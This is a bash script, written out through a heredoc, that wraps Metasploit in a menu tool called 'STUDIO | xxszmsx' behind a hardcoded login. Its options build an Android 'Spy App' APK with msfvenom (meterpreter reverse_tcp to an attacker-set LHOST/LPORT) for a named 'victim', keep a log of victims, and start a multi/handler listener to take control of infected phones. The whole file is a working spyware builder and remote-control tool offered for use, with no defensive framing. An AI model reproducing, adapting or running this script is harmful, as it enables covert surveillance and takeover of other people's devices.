cat << 'EOF' > xxszmsx.sh
#!/bin/bash
# =====================================================
# TOOL: STUDIO | xxszmsx
# VERSION: 10.0 (OFFICIAL INTERFACE)
# DEVELOPER: STUDIO
# =====================================================

RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; BLUE='\e[1;34m'; NC='\e[0m'
LOG_FILE=".victims_log.txt"
DB_FILE=".studio_config"

# --- [ LOGIN INTERFACE ] ---
clear
echo -e "${RED}====================================================="
echo -e "         STUDIO | xxszmsx - SECURE ACCESS            "
echo -e "=====================================================${NC}"
read -p "[+] Username: " username
read -s -p "[+] Password: " password
echo ""

if [[ "$username" != "user" || "$password" != "123456789" ]]; then
    echo -e "${RED}[!] Access Denied! Invalid Credentials.${NC}"
    exit 1
fi

while true; do
    clear
    echo -e "${RED}"
    echo " ███████╗████████╗██╗   ██╗██████╗ ██╗ ██████╗ "
    echo " ██╔════╝╚══██╔══╝██║   ██║██╔══██╗██║██╔═══██╗"
    echo " ███████╗   ██║   ██║   ██║██║  ██║██║██║   ██║"
    echo " ╚════██║   ██║   ██║   ██║██║  ██║██║██║   ██║"
    echo " ███████║   ██║   ╚██████╔╝██████╔╝██║╚██████╔╝"
    echo " ╚══════╝   ╚═╝    ╚═════╝ ╚═════╝ ╚═╝ ╚═════╝ "
    echo "   [ STUDIO ]        |        [ xxszmsx ]      "
    echo -e "${YELLOW}-----------------------------------------------------${NC}"
    echo -e "   [ SYSTEM: ACTIVE ]       [ VERSION: 10.0 ]"
    echo -e "-----------------------------------------------------"
    echo -e "1) Build Spy App (Android APK)"
    echo -e "2) View Victims Log (Database)"
    echo -e "3) Start Controller (Metasploit)"
    echo -e "0) Exit Program"
    echo "-----------------------------------------------------"
    read -p "Studio >> " choice

    case $choice in
        1) 
           read -p "Enter Victim Name: " t_name
           read -p "Enter LHOST (IP): " lh
           read -p "Enter LPORT (Port): " lp
           echo "$lh:$lp" > "$DB_FILE"
           echo "[$(date +%Y-%m-%d_%H:%M)] Target: $t_name | IP: $lh | Port: $lp" >> "$LOG_FILE"
           
           echo -e "${YELLOW}[*] Generating Encrypted APK...${NC}"
           msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R > "/sdcard/studio_spy.apk"
           echo -e "${GREEN}[+] Success! File saved to storage as studio_spy.apk${NC}" ;;
        2)
           clear
           echo -e "${BLUE}--- [ SECURE VICTIMS DATABASE ] ---${NC}"
           if [ -f "$LOG_FILE" ]; then
               cat "$LOG_FILE"
           else
               echo "Database is empty."
           fi
           echo "-----------------------------------"
           read -p "Press Enter to return..." ;;
        3) 
           if [ -f "$DB_FILE" ]; then
               IP=$(cut -d: -f1 "$DB_FILE"); PORT=$(cut -d: -f2 "$DB_FILE")
               echo -e "${GREEN}[*] Initializing Master Controller on $IP:$PORT...${NC}"
               msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $PORT; set ExitOnSession false; exploit -j"
           else
               echo -e "${RED}[!] Error: No configuration found.${NC}"; sleep 2
           fi ;;
        0) exit 0 ;;
        *) echo -e "${RED}[!] Invalid Selection${NC}"; sleep 1 ;;
    esac
    echo -e "\n${RED}[+] Press Enter to Continue...${NC}"; read
done
EOF
